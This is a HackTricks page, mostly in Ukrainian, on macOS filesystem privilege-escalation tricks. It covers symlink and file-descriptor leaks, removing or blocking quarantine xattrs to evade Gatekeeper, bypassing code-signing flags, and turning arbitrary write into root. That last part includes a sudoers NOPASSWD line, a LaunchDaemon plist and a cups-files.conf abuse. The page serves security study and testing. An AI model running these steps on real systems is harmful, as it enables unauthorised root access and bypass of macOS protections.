# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Комбінації POSIX permissions

Для **каталогу** три біти permissions означають дещо інше, ніж для звичайного файла. `chmod(1)` називає біт execute "**search**", коли його застосовано до каталогу:<sup>[[2]](#references)</sup>

> `0100` Для файлів — дозволяє власнику виконання. Для каталогів — дозволяє власнику виконувати **search** у каталозі.

- **read** — можна **перераховувати** записи каталогу (переглядати назви).
- **write** — можна **створювати, перейменовувати та видаляти записи** в каталозі. Зверніть увагу: це властивість *батьківського* каталогу, а не файла: можна видалити файл, який ви не можете читати або змінювати, якщо ви маєте право запису до його батьківського каталогу.
- Щоб видалити **підкаталог**, він має бути порожнім, що своєю чергою потребує достатніх прав для видалення всього його вмісту.
- Якщо каталог має **sticky bit** (`S_ISVTX`, як `/tmp`), це обмеження діє — POSIX визначає, що процес може видаляти або перейменовувати файли в ньому лише тоді, коли він є власником файла, власником каталогу або має відповідні privileges.<sup>[[1]](#references)</sup>
- **execute / search** — вам **дозволено проходити** каталогом. Розв’язання pathname знаходить кожен компонент "у каталозі, визначеному його попередником", тому **втрата прав search на будь-якому окремому компоненті префікса шляху робить усе нижче нього недоступним за шляхом**, навіть якщо leaf-файл сам по собі доступний для читання всім користувачам.<sup>[[1]](#references)</sup>

### Небезпечні комбінації

**Як перезаписати файл/папку, що належить root**, якщо:

- Власником одного **батьківського каталогу** в шляху є користувач
- Власником одного **батьківського каталогу** в шляху є **група користувачів**, яка має **write access**
- **Група користувачів** має доступ **write** до **файла**

За будь-якої з наведених комбінацій attacker може **вставити** **sym/hard link** у потрібний шлях, щоб отримати privileged arbitrary write.

### Особливий випадок кореневої папки з R+X

Це безпосередньо випливає з наведеного вище правила розв’язання pathname. Якщо **каталог надає лише R+X root**, файли всередині нього недоступні *за шляхом* для всіх інших користувачів — але **власні permission bits файлів усе ще можуть бути permissive**. Єдиною перешкодою є каталог.

Отже, будь-який primitive, який дає змогу перемістити файл **з цього каталогу** — privileged процес, що **переміщує/перейменовує/копіює** шлях, вибраний attacker, у місце, яке ви можете обходити, — перетворюється на arbitrary read, без необхідності обходити власний mode файла:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Шукайте privileged file movers (installers, log rotators, crash/diagnostic collectors, backup та функції "export"), які приймають source path від користувача з нижчим рівнем привілеїв.

## Symbolic Link / Hard Link

### Доступний file/folder

Якщо privileged process записує дані у **file**, який може бути **контрольований** користувачем з **нижчим рівнем привілеїв** або який міг бути **попередньо створений** користувачем з нижчим рівнем привілеїв. Користувач може просто **вказати його на інший file** через Symbolic або Hard link, і privileged process запише дані саме в цей file.

Перевірте інші розділи, де attacker може **зловжити довільним записом для підвищення привілеїв**.

### Open `O_NOFOLLOW`

Згідно з [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Перевіряється лише **кінцевий** компонент — кожен **проміжний** компонент усе ще визначається та переходить за ним. Тому developer, який "захистив" запис за допомогою `O_NOFOLLOW`, усе ще може бути атакований через розміщення symlink у будь-якому **батьківському directory** цільового path.<sup>[[3]](#references)</sup>

На тій самій man page задокументовано flags, які справді усувають цю проблему:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

В іншому разі `openat()` відносно directory FD, який ви вже перевірили, або `realpath()` + повторна перевірка — це решта способів запобігти symlink swaps у середині path.

## .fileloc

Files із розширенням **`.fileloc`** можуть вказувати на інші applications або binaries, тому під час їх відкриття буде виконано саме цю application/binary.\
Приклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Дескриптори файлів

### Leak FD (no `O_CLOEXEC`)

Якщо виклик `open` не має прапорця `O_CLOEXEC`, дескриптор файлу буде успадкований дочірнім процесом. Отже, якщо привілейований процес відкриває привілейований файл і запускає процес, контрольований attacker'ом, attacker **успадкує FD привілейованого файлу**.

Канонічним прикладом є **LPE через `DYLD_PRINT_TO_FILE` в OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` обробляв `DYLD_PRINT_TO_FILE=/path` навіть у **restricted (suid root) binaries**, оскільки цю конкретну змінну аналізували поза межами `processDyldEnvironmentVariable()`.
- Він виконував `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, тому **створював файл, власником якого був root, за довільним шляхом**.
- FD **ніколи не закривався і не мав close-on-exec прапорця**, тому кожен дочірній процес suid binary успадковував **доступний для запису FD до файлу, власником якого був root**.
- Запуск, наприклад, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, а потім читання номера успадкованого FD у дочірньому процесі, давав змогу виконувати довільні записи у файл, власником якого був root; `fcntl(fd, F_SETFL, 0)` навіть очищав `O_APPEND`, дозволяючи перезаписувати файл замість додавання в кінець.

Та сама схема виникає щоразу, коли привілейований процес відкриває файл **до** виконання `exec` чогось, що контролює attacker (допоміжні інструменти, редактори у стилі `crontab`, запущені через `$EDITOR`, файли журналів/налагодження, відкриті за шляхом зі змінної середовища...). Перелічити успадковані FD можна за допомогою:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Будь-що вище `2`, що вказує на файл, який ви не можете відкрити самостійно, є примітивом довільного запису (або довільного читання).

## Уникайте прийомів із quarantine xattrs

### Видаліть його
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Якщо файл/папка має цей immutable атрибут, додати до нього xattr буде неможливо
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Файлові системи без підтримки xattr

Не кожна файлова система, яку macOS може підключити, нативно зберігає **розширені атрибути**. HFS+ та APFS це підтримують; **FAT32, exFAT і (більшість) монтувань NFS — ні** — macOS емулює їх, записуючи бічний файл **AppleDouble** з назвою `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Це важливо для quarantine, оскільки xattr зберігається лише тоді, коли його справді можна записати **й прочитати назад** із того самого тому:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Якщо том пізніше читається через шлях, який ігнорує супровідний файл `._` (або супровідний файл вилучено/видалено), файл надходить **без quarantine flag** — а відсутності quarantine flag у `.app` достатньо, щоб обійти App Sandbox, як описано в [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Цей ACL забороняє додавати `xattrs` до файлу
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Формат файлів **AppleDouble** копіює файл разом із його ACE.

У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Отже, якщо стиснути application у zip-файл у форматі **AppleDouble** з ACL, який забороняє записувати до нього інші xattr... quarantine xattr не буде встановлено в application:

Перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) для отримання додаткової інформації.<sup>[[6]](#references)</sup>

Щоб відтворити це, спочатку потрібно отримати правильний рядок acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Зверніть увагу, що навіть якщо це спрацює, sandbox перед цим записує quarantine xattr)

Насправді це не потрібно, але я залишаю це тут про всяк випадок:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Обхід перевірок підпису

### Обхід перевірок platform binaries

Деякі перевірки безпеки перевіряють, чи є binary **platform binary**, наприклад щоб дозволити підключення до XPC service. Однак, як показано в описі обходу на https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, цю перевірку можна обійти, отримавши platform binary (наприклад, /bin/ls) і впровадивши exploit через dyld за допомогою змінної середовища `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Обхід прапорців `CS_REQUIRE_LV` і `CS_FORCED_LV`

Виконуваний binary може змінити власні прапорці, щоб обійти перевірки, за допомогою такого коду:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Обхід Code Signatures

Пакети містять файл **`_CodeSignature/CodeResources`**, який містить **hash** кожного окремого **файлу** в **пакеті**. Зверніть увагу, що **hash** CodeResources також **вбудований у виконуваний файл**, тому ми не можемо змінити й його.

Однак є деякі файли, підпис яких не перевірятиметься. Для них у plist вказано ключ `omit`, наприклад:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Підпис ресурсу можна обчислити з CLI за допомогою:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Монтування dmgs

Користувач може змонтувати спеціально створений dmg навіть поверх деяких наявних папок. Ось як можна створити спеціальний пакет dmg із власним вмістом:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Зазвичай macOS монтує диск, взаємодіючи із сервісом Mach `com.apple.DiskArbitrarion.diskarbitrariond` (надається `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до plist-файлу LaunchDaemons і перезапустити його, журнали зберігатимуться у `/var/log/diskarbitrationd.log`.\
Однак можна використовувати такі інструменти, як `hdik` і `hdiutil`, щоб безпосередньо взаємодіяти з kext `com.apple.driver.DiskImages`.

## Довільний запис

### Періодичні sh-скрипти

Якщо ваш скрипт можна інтерпретувати як **shell script**, ви можете перезаписати **`/etc/periodic/daily/999.local`** shell script, який запускатиметься щодня.

Ви можете **імітувати** виконання цього скрипту за допомогою: **`sudo periodic daily`**

### Daemons

Запишіть довільний **LaunchDaemon**, наприклад **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, із plist, що запускає довільний скрипт, наприклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Просто створіть скрипт `/Applications/Scripts/privesc.sh` із **командами**, які ви хочете виконати від імені root.

### Файл Sudoers

Якщо у вас є **arbitrary write**, ви можете створити файл у папці **`/etc/sudoers.d/`**, надавши собі привілеї **sudo**.

### Файли PATH

Файл **`/etc/paths`** є одним із основних місць, звідки формується змінна середовища PATH. Для його перезапису потрібні права root, але якщо скрипт із **privileged process** виконує певну **команду без повного шляху**, ви можете отримати змогу **hijack** її, змінивши цей файл.

Також можна записувати файли в **`/etc/paths.d`**, щоб додавати нові папки до змінної середовища `PATH`.

### cups-files.conf

Цю техніку було використано в [цьому writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Створіть файл `/etc/cups/cups-files.conf` із таким вмістом:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Це створить файл `/etc/sudoers.d/lpe` із правами доступу 777. Додатковий непотрібний текст наприкінці потрібен для запуску створення журналу помилок.

Потім запишіть у `/etc/sudoers.d/lpe` потрібну конфігурацію для підвищення привілеїв, наприклад `%staff ALL=(ALL) NOPASSWD:ALL`.

Після цього знову змініть файл `/etc/cups/cups-files.conf`, вказавши `LogFilePerm 700`, щоб новий файл sudoers став дійсним під час виклику `cupsctl`.

### Обхід Sandbox

Можна вийти за межі macOS sandbox за допомогою довільного запису у FS. Приклади наведено на сторінці [macOS Auto Start](../../../../macos-auto-start-locations.md), але поширений спосіб полягає в тому, щоб записати файл налаштувань Terminal у `~/Library/Preferences/com.apple.Terminal.plist`, який виконує команду під час запуску, а потім викликати його за допомогою `open`.

## Створення доступних для запису файлів від імені інших користувачів

Дуже поширений примітив privesc полягає в тому, щоб змусити **привілейований процес створити файл для вас** у каталозі, який ви контролюєте, а потім зберегти **доступ на запис** до цього файлу. Потрібні два компоненти:

1. Каталог, власником якого ви є (або в якому можна встановити **успадковуваний ACL**), щоб усе створене всередині успадковувало ваші дозволи.
2. Привілейований процес/процес `suid`, якому можна вказати, **де** створити файл — зазвичай через змінну середовища debug/logging, файл конфігурації або XPC API helper-процесу.

Саме частина з **успадковуваним ACL** забезпечує доступність створеного файлу для запису з вашого боку, навіть якщо його власником є інший користувач. Прапорці успадкування `file_inherit` / `directory_inherit` описані в [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Тепер будь-який файл, який privileged process створює всередині `$DIRNAME`, **доступний для запису вам**. Якщо цей каталог також є місцем, яке згодом **виконується від імені root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, каталог LaunchDaemon...), це пряме підвищення привілеїв до root. Дивіться розділи [Sudoers File](#sudoers-file) і [cups-files.conf](#cups-filesconf) вище, щоб дізнатися, що записати після отримання файлу.

Повний практичний приклад ланцюжка «змінна середовища змушує root process створити файл, а FD витікає до вас» наведено вище в розділі [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## Спільна пам’ять POSIX

**Спільна пам’ять POSIX** дає змогу процесам у POSIX-сумісних операційних системах отримувати доступ до спільної області пам’яті, забезпечуючи швидший обмін даними порівняно з іншими методами міжпроцесної комунікації. Вона передбачає створення або відкриття об’єкта спільної пам’яті за допомогою `shm_open()`, встановлення його розміру через `ftruncate()` і відображення його в адресний простір процесу за допомогою `mmap()`. Після цього процеси можуть безпосередньо читати та записувати дані в цю область пам’яті. Для керування одночасним доступом і запобігання пошкодженню даних часто використовують механізми синхронізації, такі як mutex або semaphore. Зрештою процеси скасовують відображення та закривають спільну пам’ять за допомогою `munmap()` і `close()`, а за потреби видаляють об’єкт пам’яті через `shm_unlink()`. Ця система особливо ефективна для швидкого IPC у середовищах, де кільком процесам потрібно оперативно отримувати доступ до спільних даних.

<details>

<summary>Приклад коду Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Приклад коду споживача</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** are a security feature introduced in macOS to enhance the safety and reliability of **file descriptor operations** in user applications. These guarded descriptors provide a way to associate specific restrictions or "guards" with file descriptors, which are enforced by the kernel.

This feature is particularly useful for preventing certain classes of security vulnerabilities such as **unauthorized file access** or **race conditions**. These vulnerabilities occurs when for example a thread is accessing a file description giving **another vulnerable thread access over it** or when a file descriptor is **inherited** by a vulnerable child process. Some functions related to this functionality are:

- `guarded_open_np`: Opens a file descriptor with a guard
- `guarded_close_np`: Close it
- `change_fdguard_np`: Change guard flags on a descriptor (even removing the guard protection)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
